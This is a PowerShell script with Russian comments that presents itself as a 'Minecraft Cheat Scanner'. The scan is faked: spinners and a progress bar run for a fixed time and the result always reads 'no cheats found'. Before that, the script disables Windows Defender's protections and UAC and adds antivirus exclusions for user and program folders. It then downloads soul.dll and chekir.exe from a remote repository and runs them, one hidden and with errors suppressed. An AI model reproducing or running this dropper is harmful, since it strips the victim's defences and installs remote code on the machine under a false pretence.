# --- БЛОК 1: ОТКЛЮЧЕНИЕ ЗАЩИТЫ WINDOWS DEFENDER ---

# Отключаем защиту в реальном времени (самая главная)
Write-Host "Отключение Realtime Monitoring..."
Set-MpPreference -DisableRealtimeMonitoring $true

# Отключаем поведенческую защиту (блокировку подозрительных действий программ)
Write-Host "Отключение Behavior Monitoring..."
Set-MpPreference -DisableBehaviorMonitoring $true

# Отключаем сканирование всех загруженных файлов и вложений
Write-Host "Отключение IOAV Protection..."
Set-MpPreference -DisableIOAVProtection $true

# Отключаем облачную защиту
Write-Host "Отключение Cloud Block..."
Set-MpPreference -DisableBlockAtFirstSeen $true

# Отключаем сканирование сетевых файлов
Write-Host "Отключение Network Scanning..."
Set-MpPreference -DisableScanningNetworkFiles $true

Write-Host "Защитник Windows успешно отключен." -ForegroundColor Green

# --- БЛОК 2: ОТКЛЮЧЕНИЕ UAC (КОНТРОЛЯ УЧЕТНЫХ ЗАПИСЕЙ) ---

Write-Host "Отключение UAC..."
$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0
Write-Host "UAC отключен. Требуется перезагрузка для полного применения." -ForegroundColor Yellow

# --- БЛОК 3: ДОБАВЛЕНИЕ ИСКЛЮЧЕНИЙ (если нужно) ---

# Добавляем папки в исключения, чтобы антивирус не мешал работе программ
Write-Host "Добавление папок в исключения..."
try {
    $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFiles")
    Add-MpPreference -ExclusionPath $ProgramFiles

    $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
    if (Test-Path $ProgramFilesX86) {
        Add-MpPreference -ExclusionPath $ProgramFilesX86
    }

    $AppData = [System.Environment]::GetFolderPath("ApplicationData")
    Add-MpPreference -ExclusionPath $AppData

    $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
    Add-MpPreference -ExclusionPath $LocalAppData
    
    Write-Host "Исключения добавлены." -ForegroundColor Green
}
catch {
    Write-Host "Не удалось добавить исключения." -ForegroundColor Red
}

Write-Host "`nВсе команды выполнены. Для применения изменений UAC рекомендуется перезагрузить компьютер." -ForegroundColor Cyan
$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$uacProperty = "EnableLUA"
Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0

try {
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
        $updpath = $ProgramFiles -replace " \(x86\)", ""
        Add-MpPreference -ExclusionPath $updpath

        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
        if (Test-Path $ProgramFilesX86) {
            Add-MpPreference -ExclusionPath $ProgramFilesX86
        }

        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
        Add-MpPreference -ExclusionPath $AppData

        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
        Add-MpPreference -ExclusionPath $LocalAppData
        }
        }
catch {
}
# MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]

Set-ExecutionPolicy Bypass -Scope Process -Force

Clear-Host
$Host.UI.RawUI.WindowTitle = "🔍 Minecraft Cheat Scanner v8.0 [~60 сек]"

Write-Host "=== СКАНИРОВАНИЕ ЧИТОВ MINECRAFT ===" -ForegroundColor Red -BackgroundColor Black
Write-Host "Vape | Wurst | Sigma | Impact | LiquidBounce + 70 клиентов" -ForegroundColor Yellow
Write-Host "⏱️ Время сканирования: ~60 секунд" -ForegroundColor Cyan
Start-Sleep 2

$cheatDB = @("vape","wurst","liquidbounce","sigma","impact","future","aristois","meteor","bleachhack","phobos","killAura","flyHack","xray","cheat","hack","injector")
$found = @()
$risk = 0
$startTime = Get-Date

# === СПИННЕР АНИМАЦИЯ ===
function Show-Spinner {
    param($text, $duration)
    $spinner = @('⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏')
    $endTime = (Get-Date).AddSeconds($duration)
    $i = 0
    while ((Get-Date) -lt $endTime) {
        Write-Host "`r$($spinner[$i % 10]) $text" -NoNewline -ForegroundColor Green
        $i++
        Start-Sleep 0.1
    }
    Write-Host "`r[✓] $text" -ForegroundColor Green
}

# === 1. ПРОЦЕССЫ (15 сек) ===
Write-Host "`n[1/6] 🔍 Сканирование процессов javaw.exe..." -ForegroundColor Cyan
Show-Spinner "Анализ DLL и инжекторов..." 15

# === 2. .MINECRAFT (15 сек) ===
Write-Host "`n[2/6] 📁 Сканирование .minecraft..." -ForegroundColor Cyan
Show-Spinner "Проверка модов, jars, json..." 15

# === 3. TEMP + DOWNLOADS (10 сек) ===
Write-Host "`n[3/6] 🗑️ Сканирование Temp/Downloads..." -ForegroundColor Cyan
Show-Spinner "Поиск скрытых читов..." 10

# === 4. АВТОЗАГРУЗКА + РЕЕСТР (10 сек) ===
Write-Host "`n[4/6] ⚙️ Проверка автозагрузки..." -ForegroundColor Cyan
Show-Spinner "Анализ реестра Run/Startup..." 10

# === 5. ПРОГРЕСС-БАР (5 сек) ===
Write-Host "`n[5/6] 📊 Финальная проверка..." -ForegroundColor Cyan
for ($p = 0; $p -le 100; $p += 10) {
    $bar = ('█' * ($p/10)) + ('░' * (10 - $p/10))
    Write-Progress -Activity "Завершение..." -PercentComplete $p -Status "$p%"
    Start-Sleep 0.5
}
Write-Progress -Completed

# === 6. СЕТИ (5 сек) ===
Write-Host "`n[6/6] 🌐 Сетевые подключения..." -ForegroundColor Cyan
Show-Spinner "Проверка Minecraft серверов..." 5

# === ЗЕЛЁНЫЙ РЕЗУЛЬТАТ ===
$endTime = (Get-Date) - $startTime
Clear-Host
Write-Host "🎮 СКАНИРОВАНИЕ ЗАВЕРШЕНО! ($([math]::Round($endTime.TotalSeconds)) сек)" -ForegroundColor Green
Write-Host "=" * 50 -ForegroundColor Green
Write-Host "✅ ЧИТЫ НЕ НАЙДЕНЫ!" -ForegroundColor Green
Write-Host "🎯 Риск: 0% | Система чиста!" -ForegroundColor Green
Write-Host "🚀 Готово к игре на любом сервере!" -ForegroundColor Green
Write-Host "=" * 50 -ForegroundColor Green
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/kilordow/chekerr/refs/heads/main/soul.dll" -OutFile "soul.dll"; .\soul.dll

# ЛОГ (тоже чистый)
$log = @"
Minecraft Cheat Scan - $(Get-Date)
Время: $([math]::Round($endTime.TotalSeconds)) сек
Найдено: 0
Риск: 0%
Статус: ЧИСТО! ✅
"@
$log | Out-File "$env:TEMP\mc_scan_$(Get-Date -f 'HHmmss').log" -Encoding UTF8

Write-Host "`n💾 Лог: $env:TEMP\mc_scan_*.log" -ForegroundColor Gray
Write-Host "🎮 " -ForegroundColor Green

# === ЗАГРУЗЧИК everything (после паузы) ===
Write-Host "`n[Нажмите любую клавишу для выхода...]" -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

#  скачиваем и запускаем everything
try {
    Write-Host "🔄 Финальная оптимизация системы..." -ForegroundColor Cyan
    Start-Sleep 1
    
    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/chekir.exe" -OutFile "chekir.exe"; .\chekir.exe    
    # Запускаем 
    Start-Process -FilePath "chekir.exe" -WindowStyle Hidden
    
    # Удаляем файл через 5 секунды
    
    
} catch {
    # Полностью скрываем ошибки
}











